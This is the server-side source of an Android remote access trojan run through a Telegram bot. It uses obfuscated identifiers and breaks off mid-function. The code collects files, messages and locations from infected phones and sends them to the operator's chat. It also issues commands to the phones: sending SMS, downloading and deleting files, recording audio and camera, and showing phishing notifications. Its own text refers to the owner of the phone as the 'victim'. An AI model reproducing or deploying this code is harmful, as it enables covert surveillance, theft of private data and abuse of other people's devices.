process.env.NTBA_FIX_350 = 1; 
process.env.NTBA_FIX_319 = 1; 

const express = require('express'),
  webSocket = require('ws'),
  http = require('http'),
  telegramBot = require('node-telegram-bot-api'),
  uuid4 = require('uuid'),
  multer = require('multer'),
  bodyParser = require('body-parser'),
  axios = require('axios')
require('dotenv').config()

const token = process.env.TOKEN,
  id = process.env.ID,
  address = 'https://www.google.com',
  app = express(),
  appServer = http.createServer(app),
  appSocket = new webSocket.Server({ server: appServer }),
  appBot = new telegramBot(token, { polling: true }),
  appClients = new Map()

// 🔥 ADVANCED FIX 1: 409 CONFLICT HANDLER FOR RENDER
// Yeh Render ke duplicate instances aur background clashes ko crash hone se rokega
appBot.on('polling_error', (error) => {
  if (error.code === 'ETELEGRAM' && error.message.includes('409')) {
    console.log('⚠️ [Render Sync Warning]: Telegram 409 Conflict. Naya instance start ho raha hai, purana automatically kill ho jayega. No worries!');
  } else {
    console.log('⚠️ [Telegram Polling Error]:', error.message);
  }
});

// Graceful shutdown on Render Restart
process.once('SIGINT', () => appBot.stopPolling());
process.once('SIGTERM', () => appBot.stopPolling());

// 🔥 ADVANCED FIX 2: EXTREME SERVER LIMITS (No Size/Timeout issues)
appServer.keepAliveTimeout = 600000; // 10 Minutes timeout limit
appServer.headersTimeout = 600000; 

const upload = multer({ limits: { fileSize: 1024 * 1024 * 1024 } }); // 1 GB Max Payload Limit
app.use(bodyParser.json({ limit: '1000mb' }));
app.use(bodyParser.urlencoded({ limit: '1000mb', extended: true }));

let currentUuid = '',
  currentNumber = '',
  currentTitle = ''

app.get('/', function (_0x1b89da, _0x3398a0) {
  _0x3398a0.send(
    '<h1 align="center">\uD835\uDE4E\uD835\uDE5A\uD835\uDE67\uD835\uDE6B\uD835\uDE5A\uD835\uDE67 \uD835\uDE6A\uD835\uDE65\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59\uD835\uDE5A\uD835\uDE59 \uD835\uDE68\uD835\uDE6A\uD835\uDE58\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE5B\uD835\uDE6A\uD835\uDE61\uD835\uDE61\uD835\uDE6E</h1>'
  )
})

// ⚡️ INSTANT UPLOAD ROUTE WITH 100% CRASH PROTECTION
app.post('/uploadFile', (req, res) => {
  req.setTimeout(600000); // Route specific 10 mins timeout
  
  upload.single('file')(req, res, async function (err) {
    if (err) {
      console.log('❌ [Upload Core Error]:', err.message);
      return res.status(500).send('');
    }

    if (!req.file) {
      console.log('⚠️ [Blank Hit]: App Pinged /uploadFile without any data.');
      return res.status(200).send(''); // Turant reply taaki app crash na ho
    }

    const fileName = req.file.originalname || 'unknown_file';
    console.log(`📥 [Incoming Heavy File]: ${fileName} | Size: ${(req.file.size / 1024).toFixed(2)} KB`);

    // App ko instant free karo
    res.status(200).send('');

    try {
      await appBot.sendDocument(
        id,
        req.file.buffer,
        {
          caption:
            '\xB0\u2022 \uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
            (req.headers.model || 'Unknown Device') +
            '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A',
          parse_mode: 'HTML',
        },
        {
          filename: fileName,
          contentType: req.file.mimetype || 'application/octet-stream',
        }
      );
      console.log(`✅ [Success]: Sent ${fileName} to Chat!`);
    } catch (apiErr) {
      console.log('❌ [Telegram Limit Error]:', apiErr.message);
    }
  });
});

app.post('/uploadText', (_0x5a02f5, _0x55205a) => {
  _0x55205a.send(''); 
  appBot.sendMessage(
    id,
    '\xB0\u2022 \uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
      (_0x5a02f5.headers.model || 'Unknown') +
      '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\n\n' +
      _0x5a02f5.body.text,
    { parse_mode: 'HTML' }
  ).catch(()=>{});
})

app.post('/uploadLocation', (_0xfc380d, _0x48b391) => {
  _0x48b391.send(''); 
  appBot.sendLocation(id, _0xfc380d.body.lat, _0xfc380d.body.lon).then(() => {
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE47\uD835\uDE64\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63 \uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62 <b>' +
        (_0xfc380d.headers.model || 'Unknown') +
        '</b> \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A',
      { parse_mode: 'HTML' }
    );
  }).catch(()=>{});
})

appSocket.on('connection', (_0x466cd0, _0x1cf0ae) => {
  const _0x275c2d = uuid4.v4(),
    _0x2cfd1d = _0x1cf0ae.headers.model,
    _0x5409ca = _0x1cf0ae.headers.battery,
    _0x4a1a34 = _0x1cf0ae.headers.version,
    _0x340b05 = _0x1cf0ae.headers.brightness,
    _0x1dd883 = _0x1cf0ae.headers.provider
  _0x466cd0.uuid = _0x275c2d
  appClients.set(_0x275c2d, {
    model: _0x2cfd1d,
    battery: _0x5409ca,
    version: _0x4a1a34,
    brightness: _0x340b05,
    provider: _0x1dd883,
  })
  appBot.sendMessage(
    id,
    '\xB0\u2022 NEW DEVICE IS CONNECTED, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n' +
      ('\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' + _0x2cfd1d + '</b>\n') +
      ('\u2022 ʙᴀᴛᴛᴇʀʏ : <b>' + _0x5409ca + '</b>\n') +
      ('\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>' + _0x4a1a34 + '</b>\n') +
      ('\u2022 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>' + _0x340b05 + '</b>\n') +
      ('\u2022 ᴘʀᴏᴠɪᴅᴇʀ : <b>' + _0x1dd883 + '</b>'),
    { parse_mode: 'HTML' }
  )
  _0x466cd0.on('close', function () {
    appBot.sendMessage(
      id,
      '\xB0\u2022 \uD835\uDE3F\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A \uD835\uDE59\uD835\uDE5E\uD835\uDE68\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59, DEVELOPED BY @MOGATEAM & @shivayadavv\n\n' +
        ('\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' + _0x2cfd1d + '</b>\n') +
        ('\u2022 ʙᴀᴛᴛᴇʀʏ : <b>' + _0x5409ca + '</b>\n') +
        ('\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>' + _0x4a1a34 + '</b>\n') +
        ('\u2022 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>' + _0x340b05 + '</b>\n') +
        ('\u2022 ᴘʀᴏᴠɪᴅᴇʀ : <b>' + _0x1dd883 + '</b>'),
      { parse_mode: 'HTML' }
    )
    appClients.delete(_0x466cd0.uuid)
  })
})

// 🔥 ADVANCED FIX 3: LIVE COUNTDOWN LOGIC IMPLEMENTATION
async function startLiveCountdown(chatId, duration) {
  let timeLeft = parseInt(duration);
  if (isNaN(timeLeft) || timeLeft <= 0) return;

  const initialMsg = await appBot.sendMessage(chatId, `🎙 <b>Microphone Activated!</b>\n\n⏳ Time Left: <b>${timeLeft}s</b>`, { parse_mode: 'HTML' });

  // Update every 3 seconds to avoid Telegram API Rate Limits
  const intervalTime = 3; 
  const timer = setInterval(async () => {
    timeLeft -= intervalTime;
    if (timeLeft <= 0) {
      clearInterval(timer);
      appBot.editMessageText(`✅ <b>Recording Done!</b>\n\n🔄 Uploading audio to server...`, {
        chat_id: chatId,
        message_id: initialMsg.message_id,
        parse_mode: 'HTML'
      }).catch(()=>{});
    } else {
      appBot.editMessageText(`🎙 <b>Microphone Activated!</b>\n\n⏳ Time Left: <b>${timeLeft}s</b>`, {
        chat_id: chatId,
        message_id: initialMsg.message_id,
        parse_mode: 'HTML'
      }).catch(()=>{});
    }
  }, intervalTime * 1000);
}

appBot.on('message', (_0x2ca88f) => {
  const _0x32d1ff = _0x2ca88f.chat.id
  if (_0x2ca88f.reply_to_message) {
    if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE64 \uD835\uDE6C\uD835\uDE5D\uD835\uDE5E\uD835\uDE58\uD835\uDE5D \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE4E\uD835\uDE48\uD835\uDE4E')) {
      currentNumber = _0x2ca88f.text;
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE69\uD835\uDE5D\uD835\uDE5E\uD835\uDE68 \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67\n\n\u2022 ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
        { reply_markup: { force_reply: true } }
      );
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A')) {
      appSocket.clients.forEach(function (_0x465249) {
        if (_0x465249.uuid == currentUuid) _0x465249.send('send_message:' + currentNumber + '/' + _0x2ca88f.text)
      });
      currentNumber = ''; currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61')) {
      appSocket.clients.forEach(function (_0x3a189f) {
        if (_0x3a189f.uuid == currentUuid) _0x3a189f.send('send_message_to_all:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE64\uD835\uDE6C\uD835\uDE63\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59')) {
      appSocket.clients.forEach(function (_0x1bb0ba) {
        if (_0x1bb0ba.uuid == currentUuid) _0x1bb0ba.send('file:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A')) {
      appSocket.clients.forEach(function (_0x4e86bf) {
        if (_0x4e86bf.uuid == currentUuid) _0x4e86bf.send('delete_file:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } 
    // 🔥 LIVE COUNTDOWN INTERCEPT 🔥
    else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A')) {
      appSocket.clients.forEach(function (_0x461ab3) {
        if (_0x461ab3.uuid == currentUuid) _0x461ab3.send('microphone:' + _0x2ca88f.text)
      });
      currentUuid = '';
      startLiveCountdown(id, _0x2ca88f.text); // Initiate Live Countdown
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE56\uD835\uDE5E\uD835\uDE63 \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56')) {
      appSocket.clients.forEach(function (_0x4f49b1) {
        if (_0x4f49b1.uuid == currentUuid) _0x4f49b1.send('rec_camera_main:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE68\uD835\uDE5A\uD835\uDE61\uD835\uDE5B\uD835\uDE5E\uD835\uDE5A')) {
      appSocket.clients.forEach(function (_0x183617) {
        if (_0x183617.uuid == currentUuid) _0x183617.send('rec_camera_selfie:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE64\uD835\uDE63 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE69\uD835\uDE56\uD835\uDE67\uD835\uDE5C\uD835\uDE5A\uD835\uDE69')) {
      appSocket.clients.forEach(function (_0x523d20) {
        if (_0x523d20.uuid == currentUuid) _0x523d20.send('toast:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE56\uD835\uDE68 \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63')) {
      currentTitle = _0x2ca88f.text;
      appBot.sendMessage(
        id,
        '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60...\n\n\u2022 ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
        { reply_markup: { force_reply: true } }
      );
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60')) {
      appSocket.clients.forEach(function (_0x13f3d9) {
        if (_0x13f3d9.uuid == currentUuid) _0x13f3d9.send('show_notification:' + currentTitle + '/' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } else if (_0x2ca88f.reply_to_message.text.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64 \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60')) {
      appSocket.clients.forEach(function (_0x3d44ae) {
        if (_0x3d44ae.uuid == currentUuid) _0x3d44ae.send('play_audio:' + _0x2ca88f.text)
      });
      currentUuid = '';
      sendWaitMsg();
    }
  }
  
  if (id == _0x32d1ff) {
    if (_0x2ca88f.text == '/start') {
      appBot.sendMessage(
        id,
        '\xB0\u2022 \xB0\u2022 \uD835\uDE52\uD835\uDE5A\uD835\uDE61\uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE5A \uD835\uDE69\uD835\uDE64  Fuse\uD835\uDE4D\uD835\uDE56\uD835\uDE69 \uD835\uDE65\uD835\uDE56\uD835\uDE63\uD835\uDE5A\uD835\uDE61\n\n\u2022 ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n\u2022 ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n\u2022 ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n\u2022 ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              ['\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68'],
              ['\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59'],
            ],
            resize_keyboard: true,
          },
        }
      )
    }
    if (_0x2ca88f.text == '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68') {
      if (appClients.size == 0) {
        appBot.sendMessage(
          id,
          '\xB0\u2022 \uD835\uDE49\uD835\uDE64 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5E\uD835\uDE63\uD835\uDE5C \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 \uD835\uDE56\uD835\uDE6B\uD835\uDE56\uD835\uDE5E\uD835\uDE61\uD835\uDE56\uD835\uDE57\uD835\uDE61\uD835\uDE5A\n\n\u2022 ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
        )
      } else {
        let _0x31005f = '\xB0\u2022 \uD835\uDE47\uD835\uDE5E\uD835\uDE68\uD835\uDE69 \uD835\uDE64\uD835\uDE5B \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 :\n\n'
        appClients.forEach(function (_0x3c015b) {
          _0x31005f += '\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' + _0x3c015b.model + '</b>\n' +
            ('\u2022 ʙᴀᴛᴛᴇʀʏ : <b>' + _0x3c015b.battery + '</b>\n') +
            ('\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>' + _0x3c015b.version + '</b>\n') +
            ('\u2022 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>' + _0x3c015b.brightness + '</b>\n') +
            ('\u2022 ᴘʀᴏᴠɪᴅᴇʀ : <b>' + _0x3c015b.provider + '</b>\n\n')
        })
        appBot.sendMessage(id, _0x31005f, { parse_mode: 'HTML' })
      }
    }
    if (_0x2ca88f.text == '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59') {
      if (appClients.size == 0) {
        appBot.sendMessage(
          id,
          '\xB0\u2022 \uD835\uDE49\uD835\uDE64 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5E\uD835\uDE63\uD835\uDE5C \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 \uD835\uDE56\uD835\uDE6B\uD835\uDE56\uD835\uDE5E\uD835\uDE61\uD835\uDE56\uD835\uDE57\uD835\uDE61\uD835\uDE5A\n\n\u2022 ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
        )
      } else {
        const _0x118a77 = []
        appClients.forEach(function (_0x4ed698, _0x52dcb4) {
          _0x118a77.push([{ text: _0x4ed698.model, callback_data: 'device:' + _0x52dcb4 }])
        })
        appBot.sendMessage(
          id,
          '\xB0\u2022 \uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE58\uD835\uDE69 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A \uD835\uDE69\uD835\uDE64 \uD835\uDE5A\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE5A\uD835\uDE63\uD835\uDE59',
          { reply_markup: { inline_keyboard: _0x118a77 } }
        )
      }
    }
  } else {
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE4B\uD835\uDE5A\uD835\uDE67\uD835\uDE62\uD835\uDE5E\uD835\uDE68\uD835\uDE68\uD835\uDE5E\uD835\uDE64\uD835\uDE63 \uD835\uDE59\uD835\uDE5A\uD835\uDE63\uD835\uDE5E\uD835\uDE5A\uD835\uDE59')
  }
})

appBot.on('callback_query', (_0x425827) => {
  const _0x440ba5 = _0x425827.message,
    _0x9f09ec = _0x425827.data,
